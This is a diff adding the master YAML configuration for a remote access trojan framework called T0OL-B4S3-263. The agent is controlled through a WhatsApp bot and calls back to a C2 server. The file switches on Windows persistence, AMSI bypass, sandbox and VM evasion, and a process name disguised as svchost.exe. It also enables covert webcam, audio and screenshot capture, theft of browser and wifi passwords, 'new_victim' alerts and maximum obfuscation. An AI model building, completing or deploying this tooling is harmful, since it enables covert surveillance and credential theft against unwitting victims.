@@ -1,0 +1,417 @@
+# ═══════════════════════════════════════════════════════════════════════════
+# T0OL-B4S3-263 MASTER CONFIGURATION FILE
+# ═══════════════════════════════════════════════════════════════════════════
+# This is the SINGLE SOURCE OF TRUTH for all framework components
+# All components (Agent, Server, Bot) read from this configuration
+# Do NOT duplicate these settings elsewhere in the codebase
+# ═══════════════════════════════════════════════════════════════════════════
+
+# ==============================================================================
+# DEPLOYMENT PROFILE (Choose: LocalTest, RemoteServer, HybridMode)
+# ==============================================================================
+deployment_profile: "LocalTest"  # Options: LocalTest, RemoteServer, HybridMode
+
+# ==============================================================================
+# SERVER CONFIGURATION (C2 Backend)
+# ==============================================================================
+server:
+  # Server listening configuration
+  listen_ip: "0.0.0.0"            # Listen on all interfaces (secure binding)
+  listen_port: 4444               # Agent callback port
+  api_port: 5000                  # REST API for Bot (internal)
+  webhook_port: 8888              # Webhook receiver for alerts
+  
+  # Internal networking
+  primary_ip: "127.0.0.1"         # IP that agents callback to (update for remote deployment)
+  backup_ip: null                 # Fallback IP for failover
+  
+  # Connection management
+  callback_timeout: 30            # seconds before marking agent offline
+  heartbeat_interval: 30          # seconds between heartbeats
+  heartbeat_timeout: 10           # seconds to wait for heartbeat response
+  max_reconnect_attempts: 5       # max reconnection retries
+  reconnect_backoff: 2            # exponential backoff multiplier (2^n)
+  
+  # Network tuning
+  socket_timeout: 60              # socket read timeout
+  buffer_size: 65536              # receive buffer size
+  max_concurrent_agents: 1000     # max simultaneous connections
+  
+  # NAT Traversal
+  nat_traversal:
+    enabled: false                # enable NAT/firewall traversal
+    stun_server: "stun.l.google.com"
+    stun_port: 3478
+    use_upnp: false               # attempt UPnP mapping
+  
+  # Database
+  database:
+    type: "sqlite"
+    path: "data/rat_sessions.db"
+    backup_path: "data/backups"
+    auto_backup: true
+    backup_interval: 3600         # seconds
+  
+  # Logging & Audit
+  logging:
+    level: "INFO"                 # DEBUG, INFO, WARNING, ERROR
+    directory: "logs/server"
+    max_file_size: 52428800       # 50MB
+    backup_count: 10
+    enable_audit: true
+    audit_directory: "logs/audit"
+  
+  # Alert system
+  alerts:
+    enabled: true
+    store_history: true
+    max_history: 1000
+    alert_types:
+      - "new_victim"
+      - "config_change"
+      - "command_failed"
+      - "high_risk_action"
+      - "media_available"
+      - "agent_offline"
+      - "privilege_escalation"
+
+# ==============================================================================
+# AGENT CONFIGURATION (RAT Executable)
+# ==============================================================================
+agent:
+  # Callback configuration
+  callback_ip: "127.0.0.1"        # Server IP to connect to
+  callback_port: 4444             # Server port to connect to
+  encryption_key: "generated_at_setup"  # Fernet key (25+ chars)
+  
+  # Connection resilience
+  retry_interval: 60              # seconds between connection attempts
+  max_retries: 0                  # 0 = infinite retries
+  jitter: true                    # add randomness to avoid detection
+  jitter_max: 30                  # max jitter seconds
+  
+  # Persistence
+  persistence:
+    enabled: true
+    methods:
+      - "registry_run_key"        # HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+      - "scheduled_task"          # Windows Task Scheduler
+      - "startup_folder"          # Startup folder in AppData
+    auto_elevate: false           # attempt UAC bypass
+    install_location: "%APPDATA%\\UpdateService\\svc.exe"  # where to place exe
+  
+  # Anti-Analysis
+  anti_analysis:
+    enable_amsi_bypass: true
+    detect_debugger: true
+    detect_vm: true
+    detect_sandbox: true
+    anti_dump: true
+    api_hooking_detection: true
+    parent_process_spoofing: false  # advanced, may cause issues
+  
+  # Stealth
+  stealth:
+    hide_window: true
+    hide_taskbar: true
+    hide_process_name: true
+    use_fake_name: "svchost.exe"
+    add_file_attributes: "hidden"
+    delete_self_after_persistence: false  # leave exe, don't delete
+  
+  # Execution
+  execution:
+    shell: "cmd.exe"              # Windows command shell
+    encoding: "utf-8"
+    timeout_per_command: 120      # seconds
+    max_output_size: 10485760     # 10MB per command output
+  
+  # Media capture
+  media:
+    screenshot:
+      enabled: true
+      quality: 85                 # JPEG quality 1-100
+      interval: 0                 # 0 = on-demand only
+      max_width: 1920
+      format: "JPEG"
+    
+    audio:
+      enabled: true
+      sample_rate: 44100
+      duration: 30                # seconds max per recording
+      format: "WAV"
+      auto_compression: true      # convert to MP3
+    
+    webcam:
+      enabled: true
+      interval: 0                 # 0 = on-demand only
+      format: "JPEG"
+      quality: 80
+
+# ==============================================================================
+# WHATSAPP BOT CONFIGURATION (Frontend)
+# ==============================================================================
+bot:
+  # Connection to Server
+  server_url: "http://127.0.0.1:5000"  # Server REST API URL
+  server_api_key: "set_by_setup"       # API key for authentication
+  check_alerts_interval: 5             # seconds between alert checks
+  output_stream_timeout: 30            # seconds to wait for streaming output
+  
+  # WhatsApp settings
+  whatsapp:
+    bot_name: "T0OL-B4S3-263"
+    bot_prefix: "/"
+    owner_numbers:
+      - "+263781564004"                # Primary owner
+    admin_numbers: []                   # Additional admins
+    
+    # Auto-reply settings
+    auto_reply_enabled: true
+    welcome_message: "T0OL-B4S3-263 Online | Type /help for commands"
+    typing_indicator: true              # show "typing..." while processing
+    
+  # Message formatting
+  formatting:
+    use_emojis: true
+    bold_headers: true
+    code_blocks: true
+    max_message_length: 4096
+    split_large_output: true
+    output_truncate_lines: 50           # max lines per message
+  
+  # Media handling
+  media:
+    auto_download_screenshots: true
+    save_directory: "loot/whatsapp_media"
+    generate_thumbnails: true
+    send_file_captions: true
+    max_caption_length: 1024
+  
+  # Logging
+  logging:
+    level: "INFO"
+    directory: "logs/bot"
+    log_all_messages: false
+    log_all_commands: true
+
+# ==============================================================================
+# ENCRYPTION & SECURITY
+# ==============================================================================
+security:
+  # Encryption
+  encryption:
+    algorithm: "Fernet"           # Fernet symmetric encryption
+    key_rotation_days: 90         # rotate keys every X days
+    hash_algorithm: "sha256"
+  
+  # Authentication
+  authentication:
+    require_api_key: true
+    api_key_length: 32
+    session_timeout: 3600         # seconds
+  
+  # Network security
+  network:
+    ssl_enabled: false            # set true for HTTPS in production
+    ssl_cert_path: "certs/server.crt"
+    ssl_key_path: "certs/server.key"
+    allowed_ips: []               # empty = allow all, set for whitelist
+  
+  # Input validation
+  validation:
+    sanitize_commands: true
+    max_command_length: 10000
+    block_dangerous_patterns: true
+    dangerous_patterns:
+      - "eval("
+      - "__import__"
+      - "exec("
+      - "system("
+      - "os.system"
+
+# ==============================================================================
+# FEATURES & CAPABILITIES
+# ==============================================================================
+features:
+  # Execution capabilities
+  execute_commands: true
+  execute_powershell: true
+  execute_scripts: false          # .bat, .vbs, etc
+  
+  # Surveillance
+  surveillance:
+    screenshot: true
+    webcam: true
+    audio_record: true
+    keylogger: false              # not recommended
+    clipboard_monitor: false      # privacy concern
+  
+  # System interaction
+  file_operations: true
+  process_management: true
+  registry_access: true           # Windows only
+  network_scanning: true
+  
+  # Credential harvesting
+  credential_harvesting:
+    browser_passwords: true
+    wifi_passwords: true
+    discord_tokens: false
+    browser_history: true
+    clipboard: false
+  
+  # Ransomware simulation (CAREFUL!)
+  ransomware_simulation: false    # do NOT enable in production
+  
+  # Fun features
+  fun_features:
+    play_sound: true              # play annoying sound
+    show_message: true            # display popup message
+    open_notepad: true
+    shutdown_reboot: false        # DANGEROUS, disable by default
+  
+  # Advanced
+  process_injection: false        # complex, risky
+  dll_sideloading: false          # OS-specific
+  persistence: true
+
+# ==============================================================================
+# OBFUSCATION & ANTI-ANALYSIS
+# ==============================================================================
+obfuscation:
+  level: "maximum"                # minimal, normal, aggressive, maximum
+  
+  techniques:
+    string_encoding: true
+    control_flow_flattening: true
+    dead_code_injection: true
+    api_obfuscation: true
+    anti_decompile: true
+    polymorphic_code: true
+  
+  # String encryption
+  string_encryption:
+    enabled: true
+    algorithm: "XOR"              # XOR or AES
+    key_per_string: false
+  
+  # Control flow
+  control_flow:
+    flatten_loops: true
+    insert_fake_branches: true
+    replace_constants: true
+  
+  # Obfuscator tool settings
+  pyinstaller:
+    enabled: true
+    one_file: true                # single .exe
+    icon: null                    # path to .ico file
+    hide_console: true
+    use_upx: false                # requires UPX installed
+  
+  nuitka:
+    enabled: false                # alternative to PyInstaller
+    optimization_level: 2
+    follow_imports: false
+  
+  # Code signing (optional, requires certificate)
+  code_signing:
+    enabled: false
+    certificate_path: null
+    sign_with_timestamp: false
+
+# ==============================================================================
+# DEPLOYMENT MODES (choose based on deployment_profile above)
+# ==============================================================================
+deployment_modes:
+  LocalTest:
+    description: "All components on localhost - FOR TESTING ONLY"
+    server:
+      listen_ip: "127.0.0.1"
+      primary_ip: "127.0.0.1"
+    agent:
+      callback_ip: "127.0.0.1"
+    bot:
+      server_url: "http://127.0.0.1:5000"
+  
+  RemoteServer:
+    description: "Remote C2 server with agents calling back over internet"
+    server:
+      listen_ip: "0.0.0.0"
+      primary_ip: "YOUR_PUBLIC_IP"  # CHANGE THIS
+      ssl_enabled: true
+    agent:
+      callback_ip: "YOUR_PUBLIC_IP"  # CHANGE THIS
+      anti_analysis:
+        enabled: true
+    bot:
+      server_url: "https://YOUR_PUBLIC_IP:5000"  # CHANGE THIS
+  
+  HybridMode:
+    description: "Local server with remote agent reporting"
+    server:
+      listen_ip: "0.0.0.0"
+      primary_ip: "YOUR_LOCAL_IP"
+    agent:
+      callback_ip: "YOUR_LOCAL_IP"
+    bot:
+      server_url: "http://YOUR_LOCAL_IP:5000"
+
+# ==============================================================================
+# EXPERIMENTAL & ADVANCED FEATURES
+# ==============================================================================
+experimental:
+  # NASA-level features
+  process_hollowing: false        # advanced injection
+  reflective_dll_injection: false # in-memory loading
+  kernel_mode_operations: false   # requires elevated, risky
+  network_traffic_masking: false  # steganography
+  covert_channels: false          # DNS tunneling, etc
+  
+  # Behavioral analysis evasion
+  behavioral_evasion: false
+  timing_variation: false         # variable delays
+  resource_consumption_limiting: false  # minimize footprint
+  
+  # Machine learning features
+  ml_models:
+    enabled: false
+    predictive_commands: false    # suggest commands based on history
+    anomaly_detection: false      # detect unusual activity
+  
+  # Cloud integration
+  cloud_sync:
+    enabled: false
+    provider: null                # aws, azure, gcp
+    bucket: null
+
+# ==============================================================================
+# METADATA & VERSION
+# ==============================================================================
+metadata:
+  framework_name: "T0OL-B4S3-263"
+  framework_version: "2.0.0"
+  config_version: "1.0"
+  created_at: "2025-12-12"
+  last_updated: "2025-12-12"
+  
+  # Framework info
+  authors: ["Hxcker-263"]
+  description: "Ultimate WhatsApp RAT Control System with Modern Hacker Aesthetics"
+  license: "MIT"
+  
+  # Notes
+  notes: |
+    This is a comprehensive configuration file for the T0OL-B4S3-263 framework.
+    All components (Agent, Server, Bot) MUST read from this single configuration.
+    Never duplicate these settings elsewhere in the codebase.
+    
+    SECURITY NOTICE:
+    - Change all default IPs and ports in production
+    - Rotate encryption keys regularly
+    - Use HTTPS in production environments
+    - Keep this file secure and encrypted
+    - Never commit with real credentials to version control
+
+# ==============================================================================
